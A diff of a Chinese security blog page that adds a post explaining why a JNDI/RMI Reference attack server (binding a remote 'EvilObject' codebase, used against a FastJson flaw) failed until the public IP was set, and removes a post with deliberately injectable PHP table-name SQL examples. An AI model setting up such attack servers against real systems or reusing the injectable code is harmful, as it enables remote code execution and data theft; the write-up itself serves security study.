@@ -63,6 +63,88 @@
 
   
     
+    <h3 class="article-title"><a href="/2018/12/22/RMI-ReferenceWrapper-Stub-With-Hostname/"><span>RMI ReferenceWrapper_Stub With Hostname</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2018/12/22/RMI-ReferenceWrapper-Stub-With-Hostname/" rel="bookmark">
+        <time class="entry-date published" datetime="2018-12-22T06:06:07.000Z">
+          2018-12-22
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><p>去年我salt大哥带我搞一个存在FastJson漏洞站的时候, 在ECS上启动rmi后,使用Reference 加载远程codebase代码库的方法, 但是一直没能成功执行命令。<br>最后才了解到需要修改掉/etc/hostname文件为公网ip地址才能够正常利用, 在修改掉/etc/hostname为公网ip后,成功弹回来了shell。</p>
+<h2 id="失败原因"><a href="#失败原因" class="headerlink" title="失败原因"></a>失败原因</h2><p>当时使用的启动rmi服务的java代码。<br>RMIService.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        </span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference refObj = <span class="keyword">new</span> Reference(<span class="string">&quot;EvilObject&quot;</span>, <span class="string">&quot;EvilObject&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">        System.out.println(<span class="string">&quot;Binding &#x27;refObjWrapper&#x27; to &#x27;rmi://127.0.0.1:1099/refObj&#x27;&quot;</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;refObj&quot;</span>, refObjWrapper);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>绑定到registry中的ReferenceWrapper, 绑定的其实是ReferenceWrapper_Stub<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/RMISTUB_1.jpg" alt="-w470"><br>在与registry 1099端口协商完成之后, 最后都会访问到ReferenceWrapper_Stub上。</p>
+<p>启动RMI后, 用nmap扫描可以发现,  ReferenceWrapper_Stub引用到了一个内网ip中。</p>
+<p>在客户端从RMI中获取到ReferenceWrapper_Stub后, 经过this.decode还原成ReferenceWrapper, 然后尝试去加载这个引用, 但是因为内网ip的原因直接加载失败。 这个内网ip是ECS的内网ip， 在客户端这边肯定就加载失败了。</p>
+<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/RMISTUB_2.jpg" alt="-w1025"></p>
+<h2 id="RMI-ReferenceWrapper-Stub"><a href="#RMI-ReferenceWrapper-Stub" class="headerlink" title="RMI ReferenceWrapper_Stub"></a>RMI ReferenceWrapper_Stub</h2><p>在实例化ReferenceWrapper时,</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">String var7 = resampleLocalHost();</span><br><span class="line"><span class="keyword">if</span> (var6 == <span class="keyword">null</span>) &#123;</span><br><span class="line">    var3 = <span class="keyword">new</span> TCPEndpoint(var7, var0, var1, var2);</span><br><span class="line">    var6 = <span class="keyword">new</span> LinkedList();</span><br><span class="line">    var6.add(var3);</span><br><span class="line">    var3.listenPort = var0;</span><br><span class="line">    var3.transport = <span class="keyword">new</span> TCPTransport(var6);</span><br><span class="line">    localEndpoints.put(var5, var6);</span><br><span class="line">    <span class="keyword">if</span> (TCPTransport.tcpLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">        TCPTransport.tcpLog.log(Log.BRIEF, <span class="string">&quot;created local endpoint for socket factory &quot;</span> + var2 + <span class="string">&quot; on port &quot;</span> + var0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">synchronized</span>(var6) &#123;</span><br><span class="line">        var3 = (TCPEndpoint)var6.getLast();</span><br><span class="line">        String var9 = var3.host;</span><br><span class="line">        <span class="keyword">int</span> var10 = var3.port;</span><br><span class="line">        TCPTransport var11 = var3.transport;</span><br><span class="line">        <span class="keyword">if</span> (var7 != <span class="keyword">null</span> &amp;&amp; !var7.equals(var9)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (var10 != <span class="number">0</span>) &#123;</span><br><span class="line">                var6.clear();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            var3 = <span class="keyword">new</span> TCPEndpoint(var7, var10, var1, var2);</span><br><span class="line">            var3.listenPort = var0;</span><br><span class="line">            var3.transport = var11;</span><br><span class="line">            var6.add(var3);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过resampleLocalHost来获取 Reference 要引用到的ip</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">resampleLocalHost</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String var0 = getHostnameProperty();</span><br><span class="line">    Map var1 = localEndpoints;</span><br><span class="line">    <span class="keyword">synchronized</span>(localEndpoints) &#123;</span><br><span class="line">        <span class="keyword">if</span> (var0 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!localHostKnown) &#123;</span><br><span class="line">                setLocalHost(var0);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!var0.equals(localHost)) &#123;</span><br><span class="line">                localHost = var0;</span><br><span class="line">                <span class="keyword">if</span> (TCPTransport.tcpLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">                    TCPTransport.tcpLog.log(Log.BRIEF, <span class="string">&quot;updated local hostname to: &quot;</span> + localHost);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> localHost;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先尝试使用getHostnameProperty来获取ip</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">getHostnameProperty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (String)AccessController.doPrivileged(<span class="keyword">new</span> GetPropertyAction(<span class="string">&quot;java.rmi.server.hostname&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是这里由于我们的RMIService没有设置java.rmi.server.hostname所以这里返回null。<br>当从getHostnameProperty获取ip失败时, 直接返回localhost属性。</p>
+<p>localhost属性在静态方法中被设置。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (localHost == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            InetAddress var0 = InetAddress.getLocalHost();</span><br><span class="line">            <span class="keyword">byte</span>[] var1 = var0.getAddress();</span><br><span class="line">            <span class="keyword">if</span> (var1[<span class="number">0</span>] == <span class="number">127</span> &amp;&amp; var1[<span class="number">1</span>] == <span class="number">0</span> &amp;&amp; var1[<span class="number">2</span>] == <span class="number">0</span> &amp;&amp; var1[<span class="number">3</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">                localHostKnown = <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (getBoolean(<span class="string">&quot;java.rmi.server.useLocalHostName&quot;</span>)) &#123;</span><br><span class="line">                localHost = TCPEndpoint.FQDN.attemptFQDN(var0);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                localHost = var0.getHostAddress();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var2) &#123;</span><br><span class="line">            localHostKnown = <span class="keyword">false</span>;</span><br><span class="line">            localHost = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (TCPTransport.tcpLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">        TCPTransport.tcpLog.log(Log.BRIEF, <span class="string">&quot;localHostKnown = &quot;</span> + localHostKnown + <span class="string">&quot;, localHost = &quot;</span> + localHost);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    localEndpoints = <span class="keyword">new</span> HashMap();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里使用了InetAddress.getLocalHost()来获取ip</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> InetAddress <span class="title">getLocalHost</span><span class="params">()</span> <span class="keyword">throws</span> UnknownHostException </span>&#123;</span><br><span class="line"></span><br><span class="line">    SecurityManager security = System.getSecurityManager();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        String local = impl.getLocalHostName(); <span class="comment">// 获取HostName, linux系统可以通过修改/etc/hostname文件内容来设置hostname。</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (security != <span class="keyword">null</span>) &#123;</span><br><span class="line">            security.checkConnect(local, -<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (local.equals(<span class="string">&quot;localhost&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> impl.loopbackAddress();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        InetAddress ret = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">synchronized</span> (cacheLock) &#123;</span><br><span class="line">            <span class="keyword">long</span> now = System.currentTimeMillis();</span><br><span class="line">            <span class="keyword">if</span> (cachedLocalHost != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((now - cacheTime) &lt; maxCacheTime) <span class="comment">// Less than 5s old?</span></span><br><span class="line">                    ret = cachedLocalHost;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    cachedLocalHost = <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// we are calling getAddressesFromNameService directly</span></span><br><span class="line">            <span class="comment">// to avoid getting localHost from cache</span></span><br><span class="line">            <span class="keyword">if</span> (ret == <span class="keyword">null</span>) &#123;</span><br><span class="line">                InetAddress[] localAddrs;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    localAddrs =</span><br><span class="line">                        InetAddress.getAddressesFromNameService(local, <span class="keyword">null</span>);</span><br><span class="line">                        <span class="comment">//  使用该方法根据hostname DNS解析出ip</span></span><br><span class="line">                        <span class="comment">//  这里传入该方法的hostname, 默认是在ECS的/etc/hosts中配置为内网ip。</span></span><br><span class="line">                        </span><br><span class="line">                        <span class="comment">//  root@iZwz9dtic2d71ttfu58hzhZ:/tmp# cat /etc/hosts</span></span><br><span class="line">                        <span class="comment">//  127.0.0.1   localhost</span></span><br><span class="line">                        <span class="comment">//  # The following lines are desirable for IPv6 capable hosts</span></span><br><span class="line">                        <span class="comment">//  ::1 localhost   ip6-localhost   ip6-loopback</span></span><br><span class="line">                        <span class="comment">//  ff02::1 ip6-allnodes</span></span><br><span class="line">                        <span class="comment">//  ff02::2 ip6-allrouters</span></span><br><span class="line">                        <span class="comment">//  172.18.11.117  iZwz9dtic2d71ttfu58hzhZ iZwz9dtic2d71ttfu58hzhZ</span></span><br><span class="line">                        </span><br><span class="line">                &#125; <span class="keyword">catch</span> (UnknownHostException uhe) &#123;</span><br><span class="line">                    <span class="comment">// Rethrow with a more informative error message.</span></span><br><span class="line">                    UnknownHostException uhe2 =</span><br><span class="line">                        <span class="keyword">new</span> UnknownHostException(local + <span class="string">&quot;: &quot;</span> +</span><br><span class="line">                                                 uhe.getMessage());</span><br><span class="line">                    uhe2.initCause(uhe);</span><br><span class="line">                    <span class="keyword">throw</span> uhe2;</span><br><span class="line">                &#125;</span><br><span class="line">                cachedLocalHost = localAddrs[<span class="number">0</span>];</span><br><span class="line">                cacheTime = now;</span><br><span class="line">                ret = localAddrs[<span class="number">0</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.lang.SecurityException e) &#123;</span><br><span class="line">        <span class="keyword">return</span> impl.loopbackAddress();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以Reference的ip就成了ECS的内网ip。这里只要把Reference引用到ECS的公网ip上 就能成功利用了。<br>所以可以通过修改/etc/hostname为公网ip来成功利用, 但是修改/etc/hostname后得重启才能生效,<br>更好的方法是通过<code>hostname 公网ip</code>命令 来实现不重启修改hostname(其实也就是修改/proc/sys/kernel/hostname文件内容)。</p>
+<p>从上面也可以看出,  如果设置了java.rmi.server.hostname属性之后, 该属性值就会覆盖掉静态方法所设置的localhost属性。<br>所以在启动rmi的时候 设置java.rmi.server.hostname属性为公网ip即可。</p>
+<p>RMIService.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;java.rmi.server.hostname&quot;</span>, <span class="string">&quot;你的公网ip&quot;</span>);</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Reference refObj = <span class="keyword">new</span> Reference(<span class="string">&quot;EvilObject&quot;</span>, <span class="string">&quot;EvilObject&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">        System.out.println(<span class="string">&quot;Binding &#x27;refObjWrapper&#x27; to &#x27;rmi://127.0.0.1:1099/refObj&#x27;&quot;</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;refObj&quot;</span>, refObjWrapper);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>再用nmap扫描, 就能够发现已经变为公网ip了。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/RMISTUB_5.jpg" alt="-w479"></p>
+<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/7/docs/platform/rmi/spec/rmiTOC.html">https://docs.oracle.com/javase/7/docs/platform/rmi/spec/rmiTOC.html</a></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/Web/">Web</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
     <h3 class="article-title"><a href="/2018/12/06/PHPMyFAQ-SQL-Injection-With-FILTER-VALIDATE-EMAIL/"><span>PHPMyFAQ-SQL-Injection-With-FILTER_VALIDATE_EMAIL</span></a></h3>
     
   
@@ -838,145 +920,6 @@ var_dump($_SERVER[&#39;HTTP_HOST&#39;]);</code></pre>
 <p>对请求行和请求头强制实施与RFC7230相对应的HTTP请求语法，以防止恶意客户端或下游代理对响应分裂和缓存污染</p>
 </blockquote>
 <p><img src="http://onw16foqc.bkt.clouddn.com/14929975153275.jpg"></p>
-
-      
-    </div>
-
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
-
-    
-    
-
-    <span class="post-tags">
-      <i class="icon-tags"></i>
-        <a href="/tags/Web/">Web</a>
-    </span>
-    
-
-    </div>
-
-    
-  </div>
-</article>
-
-
-
-  <article>
-
-  
-    
-    <h3 class="article-title"><a href="/2017/04/16/当表名可控的注入遇到了Describe时的几种情况。/"><span>当表名可控的注入遇到了Describe时的几种情况。</span></a></h3>
-    
-  
-
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2017/04/16/当表名可控的注入遇到了Describe时的几种情况。/" rel="bookmark">
-        <time class="entry-date published" datetime="2017-04-16T13:52:13.000Z">
-          2017-04-16
-        </time>
-      </a>
-    </span>
-  </div>
-
-
-  
-
-  <div class="article-content">
-    <div class="entry">
-      
-        <h2 id="SHOW-COLUMNS"><a href="#SHOW-COLUMNS" class="headerlink" title="SHOW COLUMNS"></a>SHOW COLUMNS</h2><p>之前小嘎嘎遇到了个注入是表前缀不可控,表名可控的注入,<br>但是在表名进入的select语句执行之前, 执行了一次SHOW COLUMNS FROM $TABLE。<br>如果SHOW COLUMNS语句执行出错了的话,<br>就不会再执行后面的SELECT语句。</p>
-<p>大概代码如:</p>
-<pre><code>mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;xiaoyu&quot;);
-mysql_query(&quot;use b2cshop&quot;);
-$table = $_GET[&#39;table&#39;];
-mysql_query(&quot;show columns from `shop_&#123;$table&#125;`&quot;) or die(&quot;show coulumns 出错:&quot;.mysql_error());
-$sql = &quot;select * from `shop_&#123;$table&#125;` where 1=1&quot;;
-echo $sql;
-echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
-var_dump(mysql_fetch_array(mysql_query(&quot;$sql&quot;)));
-echo mysql_error();</code></pre>
-<p>要解这个, 首先来看一下 SHOW COLUMNS Syntax</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SHOW [FULL] COLUMNS &#123;FROM | IN&#125; tbl_name [&#123;FROM | IN&#125; db_name]</span><br><span class="line">    [LIKE &#39;pattern&#39; | WHERE expr]</span><br></pre></td></tr></table></figure>
-
-<p>看到where 后面可以跟expr, 就很简单了。</p>
-<p><img src="http://onw16foqc.bkt.clouddn.com/14923471160467.jpg"></p>
-<hr>
-<p>解决了这个, 让我想起了我好多年前遇到的另外一种, 他不是用的show columns 而是用的describe, 当年的我没解决掉, 所以又再去看了一眼,试试能不能解决掉。 DESC这种分为几种情况。</p>
-<h2 id="DESCRIBE"><a href="#DESCRIBE" class="headerlink" title="DESCRIBE"></a>DESCRIBE</h2><blockquote>
-<p>DESCRIBE is a shortcut for SHOW COLUMNS. These statements also display information for views. The description for SHOW COLUMNS provides more information about the output columns.</p>
-</blockquote>
-<p>虽然说的是 DESCRIBE 是 SHOW COLUMNS 的shortcut,但是其实两个语法完全不同。。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#123;EXPLAIN | DESCRIBE | DESC&#125;</span><br><span class="line">    tbl_name [col_name | wild]</span><br><span class="line"></span><br><span class="line">&#123;EXPLAIN | DESCRIBE | DESC&#125;</span><br><span class="line">    [explain_type]</span><br><span class="line">    &#123;explainable_stmt | FOR CONNECTION connection_id&#125;</span><br><span class="line"></span><br><span class="line">explain_type: &#123;</span><br><span class="line">    EXTENDED</span><br><span class="line">  | PARTITIONS</span><br><span class="line">  | FORMAT &#x3D; format_name</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">format_name: &#123;</span><br><span class="line">    TRADITIONAL</span><br><span class="line">  | JSON</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">explainable_stmt: &#123;</span><br><span class="line">    SELECT statement</span><br><span class="line">  | DELETE statement</span><br><span class="line">  | INSERT statement</span><br><span class="line">  | REPLACE statement</span><br><span class="line">  | UPDATE statement</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>分几种情况来讨论。</p>
-<hr>
-<h3 id="0x01-表名完全可控且无identifier-quote。"><a href="#0x01-表名完全可控且无identifier-quote。" class="headerlink" title="0x01 表名完全可控且无identifier quote。"></a>0x01 表名完全可控且无identifier quote。</h3><pre><code>mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;xiaoyu&quot;);
-mysql_query(&quot;use b2cshop&quot;);
-$table = $_GET[&#39;table&#39;];
-mysql_query(&quot;desc $table&quot;) or die(&quot;DESC 出错:&quot;.mysql_error());
-$sql = &quot;select * from &#123;$table&#125; where 1=1&quot;;
-echo $sql;
-echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
-var_dump(mysql_fetch_array(mysql_query(&quot;$sql&quot;)));
-echo mysql_error();</code></pre>
-<p>这种的,应该实例特别少。<br>利用比较简单, 根据文档写的构造一下, 直接利用desc 来注入。<br><img src="http://onw16foqc.bkt.clouddn.com/14923478923604.jpg"></p>
-<h3 id="0x02-表名不完全可控且DESC和SELECT的表名都含有identifier-quote"><a href="#0x02-表名不完全可控且DESC和SELECT的表名都含有identifier-quote" class="headerlink" title="0x02 表名不完全可控且DESC和SELECT的表名都含有identifier quote"></a>0x02 表名不完全可控且DESC和SELECT的表名都含有identifier quote</h3><p>一般都是遇到的这种注入,会有表前缀是不可控的。</p>
-<pre><code>mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;xiaoyu&quot;);
-mysql_query(&quot;use b2cshop&quot;);
-$table = $_GET[&#39;table&#39;];
-mysql_query(&quot;desc `shop_&#123;$table&#125;`&quot;) or die(&quot;DESC 出错:&quot;.mysql_error());
-$sql = &quot;select * from `shop_&#123;$table&#125;` where 1=1&quot;;
-echo $sql;
-echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
-var_dump(mysql_fetch_array(mysql_query(&quot;$sql&quot;)));
-echo mysql_error();</code></pre>
-<p>这种想了很久, 我感觉是无解, 如果有大佬能搞定的话, 求学习。</p>
-<h3 id="0x03-表名不完全可控且DESC和SELECT的表名都不含有identifier-quote"><a href="#0x03-表名不完全可控且DESC和SELECT的表名都不含有identifier-quote" class="headerlink" title="0x03 表名不完全可控且DESC和SELECT的表名都不含有identifier quote"></a>0x03 表名不完全可控且DESC和SELECT的表名都不含有identifier quote</h3><pre><code>mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;xiaoyu&quot;);
-mysql_query(&quot;use b2cshop&quot;);
-$table = $_GET[&#39;table&#39;];
-mysql_query(&quot;desc shop_&#123;$table&#125;&quot;) or die(&quot;DESC 出错:&quot;.mysql_error());
-$sql = &quot;select * from shop_&#123;$table&#125; where 1=1&quot;;
-echo $sql;
-echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
-var_dump(mysql_fetch_array(mysql_query(&quot;$sql&quot;)));
-echo mysql_error();</code></pre>
-<p>自我感觉,依旧无解。</p>
-<h4 id="0x04-表名不完全可控且DESC的表名含有identifier-quote-SELECT的表名不含identifier-quote"><a href="#0x04-表名不完全可控且DESC的表名含有identifier-quote-SELECT的表名不含identifier-quote" class="headerlink" title="0x04 表名不完全可控且DESC的表名含有identifier quote,SELECT的表名不含identifier quote"></a>0x04 表名不完全可控且DESC的表名含有identifier quote,SELECT的表名不含identifier quote</h4><pre><code>mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;xiaoyu&quot;);
-mysql_query(&quot;use b2cshop&quot;);
-$table = $_GET[&#39;table&#39;];
-mysql_query(&quot;desc `shop_&#123;$table&#125;`&quot;) or die(&quot;DESC 出错:&quot;.mysql_error());
-$sql = &quot;select * from shop_&#123;$table&#125; where 1=1&quot;;
-echo $sql;
-echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
-var_dump(mysql_fetch_array(mysql_query(&quot;$sql&quot;)));
-echo mysql_error();</code></pre>
